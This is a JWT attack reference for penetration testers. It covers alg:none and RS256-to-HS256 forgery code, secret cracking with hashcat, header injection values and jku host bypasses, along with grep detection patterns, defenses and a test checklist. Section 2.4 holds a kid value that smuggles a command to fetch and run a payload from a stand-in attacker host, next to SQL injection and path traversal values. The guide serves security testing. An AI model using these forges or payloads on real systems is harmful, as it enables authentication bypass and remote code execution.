# JWT — attack reference

## 1. Anatomy

```
header.payload.signature
   |        |        |
   base64url-decoded -> JSON
```

Header has `alg` (HS256, RS256, ES256, EdDSA, none) and optionally `kid`,
`jku`, `x5u`, `x5c`, `typ`, `cty`. Payload has claims (`iss`, `sub`, `aud`,
`exp`, `iat`, `nbf`, `jti`, plus app-specific). Signature is HMAC or
public-key signature over `base64url(header).base64url(payload)`.

Most attacks come from the verifier accepting tokens it should reject:
weak HMAC keys, algorithm confusion, header parameter abuse, or unsigned
acceptance.

## 2. Signature attacks

### 2.1 `alg: none`

Set header `alg` to `none` (or `None`, `NONE`, `nOnE` — case-bypass for naive
filters). Empty signature. If verifier accepts: forge any payload.

```bash
# Example: forge admin
H='{"alg":"none","typ":"JWT"}'
P='{"sub":"admin","role":"admin","exp":9999999999}'
b64() { python3 -c "import base64,sys;print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode().rstrip('='))"; }
echo "$(echo -n "$H" | b64).$(echo -n "$P" | b64)."
```

Modern libraries reject `none` by default; check older PHP-JWT, jsonwebtoken
< 4.x, jjwt with default deserialisers.

### 2.2 HS256 weak key brute-force

If the server signs with a short secret:

```bash
hashcat -m 16500 token.jwt /path/to/wordlist.txt
john --format=HMAC-SHA256 token.jwt --wordlist=...
```

Confirmation: a successful crack gives the secret. Forge any payload.

Common weak-secret patterns: `secret`, `your-256-bit-secret`, `change-me`,
project name, repo name, `jwt`, dev defaults. Always test top-100 lists
first.

### 2.3 RS256 → HS256 algorithm confusion

If verifier uses public key as HMAC secret:

1. Obtain server's public key (`/.well-known/jwks.json`, JWKS endpoint, or
   crawl).
2. Sign new JWT with `alg: HS256`, key = the literal bytes of the public key
   (PEM format string).
3. Submit. Vulnerable verifier HMAC-verifies with the public key (which it
   was supposed to use for RSA), and accepts.

```python
import jwt
with open("public.pem") as f:
    pub = f.read()
forged = jwt.encode({"sub": "admin"}, pub, algorithm="HS256")
```

Test variants of pub key formatting (PEM with / without trailing newline,
DER bytes, different line endings) — implementations differ.

### 2.4 `kid` SQLi / path traversal / command injection

`kid` (key ID) tells the verifier which key to use. If the verifier looks up
the key by file path or DB query without sanitisation:

```
"kid": "../../../../dev/null"      # zero-byte file => HMAC key is empty bytes => sign with empty key
"kid": "1' UNION SELECT 'attacker_supplied_key' -- "
"kid": "x;wget attacker.tld/p|sh"
```

### 2.5 `jku` / `x5u` header

These point to a URL containing the public key (`jku` = JWK URL,
`x5u` = X.509 URL). If verifier fetches without allowlist, attacker hosts a
key, signs with private counterpart, and references their own URL.

```
"alg":"RS256","jku":"https://attacker.tld/jwks.json"
```

Bypasses if verifier has weak host validation:

```
"jku":"https://victim.tld@attacker.tld/jwks.json"
"jku":"https://attacker.tld/jwks.json#@victim.tld"
```

### 2.6 `x5c` self-signed certificate

`x5c` is an embedded cert chain. Some verifiers extract the public key from
the supplied cert and verify with it — without checking the cert is trusted.
Sign with your own private key, embed your cert, accepted.

### 2.7 Empty signature

Some libraries treat empty signature as valid for `none`; others fail-open.
Try `alg: HS256` with empty signature — verifier may not check length.

## 3. Payload attacks (after-or-without forging)

Even with valid signature, payload manipulation may succeed if:

- Server doesn't validate `aud` (token meant for service A used at service B).
- Server doesn't validate `iss`.
- Server uses unsigned claims from token (e.g. user role read from JWT but
  not re-checked against DB).
- Mass-assignment from JWT into ORM (`User.find(jwt.sub)` then trust other
  jwt fields like `is_admin`).
- `exp` not enforced or `nbf` not enforced.
- Replay accepted (no `jti` tracking).

These are authorisation/business-logic findings even if signature is correct.

## 4. Refresh / blacklist semantics

- **Refresh-token rotation absent** — stolen refresh token grants persistent
  access. Test by capturing a refresh token, using it, then using same one
  again.
- **No revocation list** — logged-out tokens still valid. Test logout, then
  replay the access token with same JWT.
- **JWT stored in localStorage** — accessible to any XSS; recommend
  HttpOnly cookies.

## 5. Detection in source

```
grep -rEn "jwt\.decode\(.*verify=False" --include='*.py'   # PyJWT verify off
grep -rEn "jwt\.verify\(.*null" --include='*.js'           # jsonwebtoken null secret
grep -rEn "jwt\.sign\(.*['\"]none['\"]"                     # forging or signing with none
grep -rEn "Algorithm\.NONE|Jwts\.parser\(\)\.parse\("      # Java jjwt without verify
grep -rEn "JwtBearer.*ValidateIssuer\s*=\s*false" --include='*.cs'
grep -rEn "JwtBearer.*ValidateAudience\s*=\s*false"
grep -rEn "RequireExpirationTime\s*=\s*false"
grep -rEn "kid.*\$\{.*\}"                                   # template substitution into key path
```

Also check JWKS endpoints expose only what's intended (`kid` set, `use:sig`,
no extra keys lingering).

## 6. Tooling

- `jwt_tool` — comprehensive: `python3 jwt_tool.py <token> -X <attack>`
  (none, hs/rs confusion, kid, jku, etc.)
- `hashcat -m 16500` — HS256/384/512 brute force
- `jwt-cracker` — node tool
- Burp `JWT Editor` extension — interactive forge & replay
- Custom Python with `pyjwt`, `cryptography`, or raw `hmac` for one-off forges

## 7. Defenses (for remediation)

1. **Pin algorithm at verify time** (`verify(token, key, algorithms=['RS256'])`).
   Never trust `alg` from the header.
2. **Reject `none`** unconditionally.
3. **Use asymmetric signing (RS256/ES256/EdDSA)** so private signing key
   stays on the issuer; downstream services hold only public key.
4. **Validate `iss`, `aud`, `exp`, `nbf`** at every verifier.
5. **Track `jti`** for replay detection on sensitive tokens.
6. **Short `exp`** for access tokens (5–15 min); rotation for refresh.
7. **Centralised JWKS** with TLS + pinned host; no `jku`/`x5u` from token.
8. **Key rotation** procedure with `kid` references — both keys valid during
   window.
9. **Not in localStorage** — HttpOnly cookie with `SameSite=Strict` for
   browser-originated requests.
10. **Don't trust JWT claims for authorisation** alone — re-query authoritative
    source for sensitive checks.

## 8. CWE / standards mapping

- CWE-347 — Improper verification of cryptographic signature
- CWE-798 — Hardcoded credentials (when HS256 secret is hardcoded)
- OWASP WSTG WSTG-SESS-10 (JWT testing)
- OWASP API Top 10 2023 API2 (Broken Authentication)
- RFC 7519 (JWT), RFC 7515 (JWS), RFC 7517 (JWK)

## 9. Quick-fire test checklist

For every JWT-using endpoint, test in order:

- [ ] `alg:none` accepted?
- [ ] HS256 secret crackable with rockyou.txt + project-specific words?
- [ ] RS→HS algorithm confusion with public key?
- [ ] Modify payload: signature still validates? (must fail)
- [ ] Strip signature: accepted? (must fail)
- [ ] `exp` past, accepted? (must fail)
- [ ] `nbf` future, accepted? (must fail)
- [ ] Different `aud`, accepted at this service? (depends — should fail)
- [ ] Replay after logout, accepted? (depends on revocation strategy)
- [ ] `kid` path traversal works?
- [ ] `jku`/`x5u` accepted from arbitrary host?
- [ ] Modifying role / scope / sub claim grants other-user access if forged?
